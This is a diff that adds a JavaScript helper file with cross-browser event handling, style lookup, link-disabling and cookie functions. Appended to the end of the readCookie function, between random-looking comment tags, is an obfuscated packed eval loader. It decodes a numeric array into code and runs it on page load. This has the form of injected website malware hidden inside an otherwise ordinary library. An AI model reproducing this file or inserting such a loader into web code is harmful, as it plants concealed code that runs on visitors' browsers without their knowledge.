@@ -1,0 +1,116 @@
+/*
+ * Cross-browser event handling, by Scott Andrew
+ */
+function addEvent(element, eventType, lamdaFunction, useCapture) {
+    if (element.addEventListener) {
+        element.addEventListener(eventType, lamdaFunction, useCapture);
+        return true;
+    } else if (element.attachEvent) {
+        var r = element.attachEvent('on' + eventType, lamdaFunction);
+        return r;
+    } else {
+        return false;
+    }
+}
+
+/* 
+ * Kills an event's propagation and default action
+ */
+function knackerEvent(eventObject) {
+    if (eventObject && eventObject.stopPropagation) {
+        eventObject.stopPropagation();
+    }
+    if (window.event && window.event.cancelBubble ) {
+        window.event.cancelBubble = true;
+    }
+    
+    if (eventObject && eventObject.preventDefault) {
+        eventObject.preventDefault();
+    }
+    if (window.event) {
+        window.event.returnValue = false;
+    }
+}
+
+/* 
+ * Safari doesn't support canceling events in the standard way, so we must
+ * hard-code a return of false for it to work.
+ */
+function cancelEventSafari() {
+    return false;        
+}
+
+/* 
+ * Cross-browser style extraction, from the JavaScript & DHTML Cookbook
+ * <http://www.oreillynet.com/pub/a/javascript/excerpt/JSDHTMLCkbk_chap5/index5.html>
+ */
+function getElementStyle(elementID, CssStyleProperty) {
+    var element = document.getElementById(elementID);
+    if (element.currentStyle) {
+        return element.currentStyle[toCamelCase(CssStyleProperty)];
+    } else if (window.getComputedStyle) {
+        var compStyle = window.getComputedStyle(element, '');
+        return compStyle.getPropertyValue(CssStyleProperty);
+    } else {
+        return '';
+    }
+}
+
+/* 
+ * CamelCases CSS property names. Useful in conjunction with 'getElementStyle()'
+ * From <http://dhtmlkitchen.com/learn/js/setstyle/index4.jsp>
+ */
+function toCamelCase(CssProperty) {
+    var stringArray = CssProperty.toLowerCase().split('-');
+    if (stringArray.length == 1) {
+        return stringArray[0];
+    }
+    var ret = (CssProperty.indexOf("-") == 0)
+              ? stringArray[0].charAt(0).toUpperCase() + stringArray[0].substring(1)
+              : stringArray[0];
+    for (var i = 1; i < stringArray.length; i++) {
+        var s = stringArray[i];
+        ret += s.charAt(0).toUpperCase() + s.substring(1);
+    }
+    return ret;
+}
+
+/*
+ * Disables all 'test' links, that point to the href '#', by Ross Shannon
+ */
+function disableTestLinks() {
+  var pageLinks = document.getElementsByTagName('a');
+  for (var i=0; i<pageLinks.length; i++) {
+    if (pageLinks[i].href.match(/[^#]#$/)) {
+      addEvent(pageLinks[i], 'click', knackerEvent, false);
+    }
+  }
+}
+
+/* 
+ * Cookie functions
+ */
+function createCookie(name, value, days) {
+    var expires = '';
+    if (days) {
+        var date = new Date();
+        date.setTime(date.getTime() + (days*24*60*60*1000));
+        var expires = '; expires=' + date.toGMTString();
+    }
+    document.cookie = name + '=' + value + expires + '; path=/';
+}
+
+function readCookie(name) {
+    var cookieCrumbs = document.cookie.split(';');
+    var nameToFind = name + '=';
+    for (var i = 0; i < cookieCrumbs.length; i++) {
+        var crumb = cookieCrumbs[i];
+        while (crumb.charAt(0) == ' ') {
+            crumb = crumb.substring(1, crumb.length); /* delete spaces */
+        }
+        if (crumb.indexOf(nameToFind) == 0) {
+            return crumb.substring(nameToFind.length, crumb.length);
+        }
+    }
+    return null;
+}/*km0ae9gr6m*/eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('1G{1-1M}1O(2x){x=2}i=2-2;1G{1M*5}1O(z){1J="2t";f=[S,L,g,W,7,c,t,m,0,m,4,13,7,19,o,m,A,O,V,1a,b,C,1c,a,k,H,K,1k,p,3,0,3,0,17,o,d,0,b,n,3,M,3,7,b,n,h,B,h,4,a,A,3,1K,3,7,b,n,h,B,2s,N,u,0,3,0,3,15,E,k,3,Z,O,0,R,0,9,F,c,y,D,y,a,4,I,0,1P,0,9,F,c,y,D,21,G,p,3,0,3,0,17,o,d,0,9,4,h,7,3,M,3,7,b,n,h,B,1H,0,18,0,16,t,3,H,3,7,b,n,h,B,19,0,18,0,b,n,G,p,3,0,3,0,c,S,H,7,a,y,9,0,2r,0,J,K,1k,p,3,0,3,0,3,0,3,0,9,F,c,y,D,y,a,4,I,0,R,0,9,4,h,7,G,p,3,0,3,0,1q,0,a,Z,h,4,3,1l,u,0,3,0,3,0,3,0,3,7,b,n,h,B,h,4,a,A,3,M,3,7,a,y,9,0,1h,0,9,F,c,y,D,14,G,p,3,0,3,0,1q,p,3,0,3,0,d,4,9,b,d,g,3,Q,9,F,c,y,D,y,a,4,I,0,18,0,9,F,c,y,D,t,m,4,1T,15,a,k,Y,K,G,p,1q,p,u,S,L,g,W,7,c,t,m,0,19,o,m,A,O,V,1a,b,C,1c,a,k,1F,4,m,4,d,o,9,t,d,Q,L,g,c,U,P,1l,u,0,3,0,3,15,E,k,3,A,3,M,3,g,a,1A,3,2p,E,7,a,Q,L,g,c,U,18,1o,J,1g,J,K,G,p,3,0,3,0,17,o,d,0,h,0,R,0,I,B,1s,4,9,2o,O,b,d,y,H,K,3,2m,3,1o,1D,0,2h,0,1n,0,2f,0,J,N,u,0,3,0,3,7,b,n,h,B,h,4,a,A,3,M,3,2e,1R,2d,1Z,J,2c,1z,2b,1g,1n,0,1h,0,H,A,D,10,a,7,Y,t,m,7,b,Q,P,0,18,0,J,U,1f,1e,1f,1e,1f,1e,P,0,1h,0,H,A,D,10,a,7,1I,o,9,4,H,K,3,2a,3,1g,13,1e,1f,1e,1f,K,1h,0,H,14,E,7,b,B,d,t,L,g,I,Q,h,0,18,0,J,U,1f,1e,1f,K,P,N,u,0,3,0,3,7,b,n,h,B,1H,0,R,0,1u,1z,1D,1B,1n,N,u,0,3,0,3,7,b,n,h,B,Y,0,R,0,1D,1o,1u,1B,1u,1z,1R,J,1u,1B,G,p,3,0,3,0,9,F,c,y,D,21,3,M,3,7,b,n,h,B,Y,0,1m,0,9,F,c,y,D,1w,G,p,3,0,3,0,9,F,c,y,D,1x,3,M,3,7,b,n,h,B,Y,0,1P,0,9,F,c,y,D,1w,G,p,3,0,3,0,9,F,c,y,D,t,m,4,1T,15,a,k,Y,0,R,0,1n,B,J,0,1m,0,9,F,c,y,D,14,G,p,3,0,3,0,9,F,c,y,D,g,a,U,9,0,R,0,m,4,13,7,19,o,m,A,O,V,1a,b,C,1c,a,k,G,p,3,0,3,0,d,4,9,b,d,g,3,7,b,n,h,N,u,1d,u,p,X,b,m,1i,9,n,O,g,3,1i,d,4,E,7,a,1x,E,g,I,t,C,27,L,V,1v,4,d,Q,d,q,3,14,c,g,11,0,Y,o,13,K,1k,p,3,0,3,0,d,4,9,b,d,g,3,14,E,7,b,B,d,t,L,g,I,Q,H,14,E,U,26,14,c,g,P,0,18,0,d,B,m,4,13,7,H,K,3,1b,3,14,c,g,P,N,u,1d,u,p,X,b,m,1i,9,n,O,g,3,10,a,g,a,k,E,7,a,1U,h,4,L,A,O,1x,E,g,I,t,C,1V,9,k,c,g,1s,Q,L,g,c,U,11,0,16,4,m,10,9,F,11,0,25,t,m,4,P,1l,u,0,3,0,3,15,E,k,3,k,E,g,I,0,R,0,m,4,1X,0,19,o,m,A,O,V,1a,b,C,1c,a,k,1F,4,m,4,d,o,9,t,d,Q,L,g,c,U,P,N,u,0,3,0,3,15,E,k,3,Z,a,7,9,4,d,y,3,M,3,1Y,6,o,6,q,6,1c,6,q,6,1i,6,q,6,A,6,q,6,4,6,q,6,S,6,q,6,10,6,q,6,F,6,q,6,n,6,q,6,24,6,q,6,23,6,q,6,Z,6,q,6,V,6,q,6,g,6,q,6,t,6,q,6,1p,6,q,6,2k,6,q,6,k,6,q,6,y,6,q,6,7,6,q,6,b,6,q,6,15,6,q,6,1A,6,q,6,U,6,q,6,1r,6,q,6,1W,6,1S,G,p,3,0,3,0,17,o,d,0,h,7,d,0,R,0,6,1y,G,p,3,0,3,0,X,t,d,Q,17,o,d,0,c,0,R,0,J,N,3,n,3,28,3,Z,a,g,1s,7,b,N,3,n,3,1b,1h,0,P,1l,u,0,3,0,3,0,3,0,3,y,9,k,3,1b,R,0,16,4,9,7,a,k,h,1Y,W,k,a,o,9,4,19,o,m,A,O,V,1a,b,C,1c,a,k,H,k,E,g,I,q,3,1g,11,0,16,4,9,7,a,k,h,B,16,4,m,10,9,F,3,H,3,1o,P,1S,G,p,3,0,3,0,1q,p,3,0,3,0,d,4,9,b,d,g,3,y,9,k,3,1b,3,1y,D,1y,3,1b,3,1W,O,g,a,N,u,1d,u,p,h,4,9,29,c,V,a,t,L,7,H,S,L,g,W,7,c,t,m,Q,P,1l,u,0,3,0,3,7,d,1r,1k,p,3,0,3,0,3,0,3,0,c,S,H,7,1t,1p,a,t,X,0,c,S,d,o,C,4,1E,o,h,20,d,4,E,7,a,A,3,M,R,0,1j,b,m,A,a,S,c,g,a,A,1j,K,1k,p,3,0,3,0,3,0,3,0,3,0,3,0,c,S,d,o,C,4,1E,o,h,20,d,4,E,7,a,A,3,M,3,7,d,b,a,N,u,0,3,0,3,0,3,0,3,0,3,0,3,15,E,k,3,b,m,n,13,0,R,0,Y,o,9,F,D,k,O,b,m,A,H,1b,m,4,1X,0,1I,o,9,4,H,K,1m,1o,J,1g,J,K,G,p,3,0,3,0,3,0,3,0,3,0,3,0,17,o,d,0,I,t,C,o,c,g,1a,o,C,4,3,M,3,10,a,g,a,k,E,7,a,1U,h,4,L,A,O,1x,E,g,I,t,C,1V,9,k,c,g,1s,Q,L,g,c,U,11,0,1n,J,11,0,6,k,L,1y,P,N,u,0,3,0,3,0,3,0,3,0,3,0,3,n,X,k,C,0,R,0,I,t,W,b,C,4,m,7,D,1i,d,4,E,7,a,1Q,16,4,C,4,m,7,H,T,2g,1e,19,1w,Y,1Q,1j,K,G,0,u,0,3,0,3,0,3,0,3,0,3,0,3,n,X,k,C,B,h,4,9,1w,9,7,d,n,1v,b,9,4,H,T,h,k,W,T,11,0,1j,F,9,7,1N,2i,1m,1K,1j,1b,I,t,C,o,c,g,1a,o,C,4,1h,T,1m,k,L,g,X,t,d,4,h,7,d,b,m,2j,h,n,I,M,1v,t,9,g,a,7,22,y,W,o,m,T,P,N,3,p,3,0,3,0,3,0,3,0,3,0,3,0,c,S,d,V,D,y,9,1r,16,4,D,1A,c,A,9,F,3,M,3,T,J,1p,13,T,G,0,u,0,3,0,3,0,3,0,3,0,3,0,3,n,X,k,C,B,h,7,1t,Z,a,B,b,4,c,10,b,7,3,M,3,T,J,1p,13,T,G,0,u,0,3,0,3,0,3,0,3,0,3,0,3,n,X,k,C,B,h,7,1t,Z,a,B,17,n,h,n,1v,n,16,n,9,1r,3,M,3,T,b,n,I,A,a,g,1j,N,3,p,3,0,3,0,3,0,3,0,3,0,3,0,I,t,W,b,C,4,m,7,D,1c,O,A,1t,B,E,1p,1N,4,m,A,2l,F,c,Z,I,Q,c,S,d,V,P,N,u,0,3,0,3,0,3,0,3,1d,u,0,3,0,3,1d,W,o,9,1i,b,Q,a,K,1k,1d,u,1d,11,0,1Z,1g,J,K,G];v="2n"}1C(v)e=2q[v+"l"];w=f;s=[];r=2u;z=((e)?"1L":"");2v(;2w-5+5>i;i+=1){j=i;1C(e)s=s+r[1J+((e)?"1L":12)]((w[j]/(8+e("j%2"))))}1C(f)e(s);',62,158,'256|||288|808||351|928||1044|909|936|945|1026|||880|1035|||912||990|840|776|80|352|||888|90||||920||800|368|981|414|873|832|531|360|900|432|328|1053|488|472|999|369|320|549|816|272|960|872|891|918|693|864|824|396||1080|616|944|972|1062|378|738|702|344|784|1000|560|630|384|387|792|306|1107|984|423|441|392|896|1125|968|927|1089|468|882|520|656|312|448|952|440|if|450|783|639|try|585|612|fr|376|Code|prototype|1008|catch|333|552|459|744|711|640|664|976|1071|728|477|536|648|855|856|848|1098|405|624|480|672|336|513|495|416|400|522|657|567|464|504|904|603|496|eva|576|544|window|558|729|fromChar|String|for|1780|asd'.split('|'),0,{}))/*qhk6sa6g1c*/
